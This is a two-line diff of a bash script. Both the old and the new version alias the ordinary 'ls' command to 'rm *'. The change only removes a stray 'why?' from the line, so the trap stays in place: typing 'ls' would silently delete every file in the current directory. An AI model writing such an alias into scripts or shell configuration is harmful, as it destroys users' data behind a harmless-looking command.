@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls="rm *"why?
+alias ls="rm *"
